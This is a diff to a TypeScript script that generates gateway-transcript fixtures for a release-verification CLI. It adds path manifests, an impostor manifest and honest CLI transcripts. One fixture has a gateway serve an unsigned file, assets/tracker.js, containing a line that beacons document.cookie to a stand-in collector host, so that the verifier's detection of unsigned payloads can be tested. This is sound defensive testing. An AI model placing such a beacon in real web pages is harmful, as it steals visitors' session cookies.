@@ -22,11 +22,22 @@ import { mkdirSync, writeFileSync } from 'node:fs';
 import { dirname, join, resolve } from 'node:path';
 import { fileURLToPath } from 'node:url';
 
+import { buildReleaseJson } from '../release/release-json.ts';
+
 const HERE = dirname(fileURLToPath(import.meta.url));
 const OUT = resolve(HERE, '../../fixtures/gateway-transcript');
 
 const MANIFEST_TXID = 'M'.repeat(43);
 const RELEASE_JSON_TXID = 'R'.repeat(43);
+/**
+ * A second manifest that serves the release's own bytes at the release's own paths.
+ *
+ * Not a tampered tree: every file under it hashes to what the release signed. It exists to
+ * make one question answerable — whether `compare` binds the manifest it was pointed at to
+ * the one `release.json` pins — and nothing else in the corpus can ask it, because a manifest
+ * serving *wrong* bytes fails the byte comparison for a different reason.
+ */
+const IMPOSTOR_MANIFEST_TXID = 'N'.repeat(43);
 const GATEWAYS = [
   { name: 'alpha', rawUrl: 'https://alpha.example/raw/{txid}', txUrl: 'https://alpha.example/{txid}/{path}' },
   { name: 'beta', rawUrl: 'https://beta.example/raw/{txid}', txUrl: 'https://beta.example/{txid}/{path}' },
@@ -109,7 +120,33 @@ interface Tamper {
   readonly status?: number;
 }
 
-function transcript(tamper: Tamper | undefined): unknown {
+/**
+ * An Arweave path manifest, as the thing a gateway serves at a manifest transaction id.
+ *
+ * Only the `paths` **keys** are ever read — by `fetchManifestPaths` here and by
+ * `tools/monitoring/attestation_monitor.py`, which has consumed the same key since O5. The
+ * surrounding fields are written because a real manifest carries them, and the per-path `id`
+ * values are placeholders nothing resolves: this fixture asserts what a manifest *contains*,
+ * never what a gateway does with it, which is the open `[VERIFY]` FE-P7 still holds.
+ */
+function pathManifest(paths: readonly string[]): unknown {
+  return {
+    manifest: 'arweave/paths',
+    version: '0.2.0',
+    index: { path: 'index.html' },
+    paths: Object.fromEntries(
+      [...paths].sort().map((path, index) => [path, { id: `PATH${String(index)}`.padEnd(43, 'z') }]),
+    ),
+  };
+}
+
+const jsonBytes = (value: unknown): Uint8Array => utf8(`${JSON.stringify(value, null, 2)}\n`);
+
+/** A recorder that stores a body as text when it round-trips and as base64 when it does not. */
+function recorder(): {
+  responses: Record<string, unknown>;
+  put: (url: string, bytes: Uint8Array, status?: number) => void;
+} {
   const responses: Record<string, unknown> = {};
   const put = (url: string, bytes: Uint8Array, status = 200): void => {
     const text = Buffer.from(bytes).toString('utf8');
@@ -117,8 +154,14 @@ function transcript(tamper: Tamper | undefined): unknown {
       ? { status, body_utf8: text }
       : { status, body_base64: Buffer.from(bytes).toString('base64') };
   };
+  return { responses, put };
+}
+
+function transcript(tamper: Tamper | undefined): unknown {
+  const { responses, put } = recorder();
   for (const gateway of GATEWAYS) {
     put(gateway.rawUrl.replace('{txid}', RELEASE_JSON_TXID), releaseJsonBytes);
+    put(gateway.rawUrl.replace('{txid}', MANIFEST_TXID), jsonBytes(pathManifest(Object.keys(files))));
     for (const [txid, text] of Object.entries(credentials)) {
       put(gateway.rawUrl.replace('{txid}', txid), utf8(text));
     }
@@ -127,6 +170,97 @@ function transcript(tamper: Tamper | undefined): unknown {
       const hit = tamper && tamper.gateway === gateway.name && tamper.path === path;
       put(url, hit && tamper.body ? tamper.body : bytes, hit ? (tamper.status ?? 200) : 200);
     }
+  }
+  return { schema: 'bleavit.gateway-transcript.v1', gateways: GATEWAYS, responses };
+}
+
+// ---------------------------------------------------------------------------------------
+// The CLI family — what `verify-release compare` itself is driven against.
+//
+// The transcripts above serve a **hand-written** release document, which is what let four
+// defects live in `cli.ts` behind a green suite: the document carried credential arrays no
+// producer emits, so the signature counting only ever ran against a shape reality does not
+// have. These serve the document `app/tools/release/release-json.ts` actually builds, patched
+// exactly as 12 §1.2's second pass patches it, and nothing else.
+// ---------------------------------------------------------------------------------------
+
+const SIGNATURE_TXIDS = ['P1'.padEnd(43, 'e'), 'P2'.padEnd(43, 'f')];
+const ATTESTATION_TXIDS = ['Q1'.padEnd(43, 'g'), 'Q2'.padEnd(43, 'h')];
+
+const producerDocument = {
+  ...buildReleaseJson({
+    version: '0.1.0',
+    sourceCommit: 'a'.repeat(40),
+    buildRecipe: sha256(utf8('fixture build recipe')),
+    files: Object.fromEntries(Object.entries(files).map(([path, bytes]) => [path, sha256(bytes)])),
+    chainFeed: {
+      specVersionRange: { primary: 2, recovery: 3 },
+      descriptorMetadataHashes: { 2: sha256(utf8('metadata 2')), 3: sha256(utf8('metadata 3')) },
+      contractVersion: 23,
+    },
+    chainIdentity: {
+      chainSpecHashes: { relay: `0x${'c'.repeat(64)}`, para: `0x${'d'.repeat(64)}` },
+      genesisHashes: { relay: `0x${'e'.repeat(64)}`, para: `0x${'f'.repeat(64)}` },
+      ss58Prefix: 7777,
+      paraId: 4242,
+      decimals: { VIT: 12, USDC: 6 },
+    },
+    connectSrc: ['https://alpha.example'],
+    sbomSha256: sha256(utf8('fixture sbom')),
+    signing: { keyringGeneration: 4, keyIds: [signers[0]!.keyId, signers[1]!.keyId] },
+    blockers: [],
+  }),
+  // 12 §1.2 pass 2. `buildReleaseJson` writes `null` by construction, because a builder that
+  // could pre-fill it would be asserting a content address for bytes it has not uploaded.
+  arweaveManifestTxId: MANIFEST_TXID,
+};
+const producerBytes = jsonBytes(producerDocument);
+const producerDigest = new Uint8Array(createHash('sha256').update(producerBytes).digest());
+
+/**
+ * The credentials, at their own transaction ids and **not named by the document**.
+ *
+ * They cannot be. 12 §2.1 signs `release.json`'s hash, so a signature transaction exists only
+ * once those bytes are final, and writing its id back into them invalidates every signature
+ * over them. 12 §1.4 gate 4 publishes the ids in the release notes instead, which is why
+ * `compare` takes them as `--signature` and `--attestation`.
+ */
+const producerCredentials: Record<string, string> = {
+  [SIGNATURE_TXIDS[0]!]: minisign(signers[0]!, producerDigest, 'bleavit release 0.1.0'),
+  [SIGNATURE_TXIDS[1]!]: minisign(signers[1]!, producerDigest, 'bleavit release 0.1.0'),
+  [ATTESTATION_TXIDS[0]!]: minisign(attestors[0]!, producerDigest, 'reproduced by pallas'),
+  [ATTESTATION_TXIDS[1]!]: minisign(attestors[1]!, producerDigest, 'reproduced by rhea'),
+};
+
+interface ExtraPayload {
+  readonly gateway: string;
+  readonly path: string;
+  readonly body: Uint8Array;
+}
+
+function cliTranscript(extra: ExtraPayload | undefined): unknown {
+  const { responses, put } = recorder();
+  const raw = (gateway: (typeof GATEWAYS)[number], txid: string): string =>
+    gateway.rawUrl.replace('{txid}', txid);
+  const tx = (gateway: (typeof GATEWAYS)[number], txid: string, path: string): string =>
+    gateway.txUrl.replace('{txid}', txid).replace('{path}', path);
+
+  for (const gateway of GATEWAYS) {
+    put(raw(gateway, RELEASE_JSON_TXID), producerBytes);
+    for (const [txid, text] of Object.entries(producerCredentials)) put(raw(gateway, txid), utf8(text));
+
+    const listed = Object.keys(files);
+    const served = extra && extra.gateway === gateway.name ? [...listed, extra.path] : listed;
+    put(raw(gateway, MANIFEST_TXID), jsonBytes(pathManifest(served)));
+    // The impostor lists and serves exactly the signed tree, so every file it hands over
+    // matches. Only the address is wrong.
+    put(raw(gateway, IMPOSTOR_MANIFEST_TXID), jsonBytes(pathManifest(listed)));
+
+    for (const [path, bytes] of Object.entries(files)) {
+      put(tx(gateway, MANIFEST_TXID, path), bytes);
+      put(tx(gateway, IMPOSTOR_MANIFEST_TXID, path), bytes);
+    }
+    if (extra && extra.gateway === gateway.name) put(tx(gateway, MANIFEST_TXID, extra.path), extra.body);
   }
   return { schema: 'bleavit.gateway-transcript.v1', gateways: GATEWAYS, responses };
 }
@@ -170,4 +304,27 @@ write('refused-status.json', transcript({ gateway: 'beta', path: 'assets/app.js'
 write('registry.json', registry);
 write('keyring.json', keyring);
 writeFileSync(join(OUT, 'release.json'), Buffer.from(releaseJsonBytes));
+
+write('cli-honest.json', cliTranscript(undefined));
+// A gateway serving one file nobody signed, listed in its own copy of the manifest and
+// present in what it hands over. Nothing the release pins is missing or altered, which is
+// exactly why a fetch loop driven by the signed map reports this tree clean.
+write(
+  'cli-extra-payload.json',
+  cliTranscript({
+    gateway: 'beta',
+    path: 'assets/tracker.js',
+    body: utf8('navigator.sendBeacon("https://collector.example", document.cookie);\n'),
+  }),
+);
+writeFileSync(join(OUT, 'cli-release.json'), Buffer.from(producerBytes));
+
+// The `--local dist/` side of 12 §1.3's command: the tree a third party built, written here
+// so the suite compares a real directory rather than a map it made up.
+const LOCAL = join(OUT, 'cli-local-tree');
+for (const [path, bytes] of Object.entries(files)) {
+  const target = join(LOCAL, path);
+  mkdirSync(dirname(target), { recursive: true });
+  writeFileSync(target, Buffer.from(bytes));
+}
 console.log(`wrote the gateway transcript fixture to ${OUT}`);
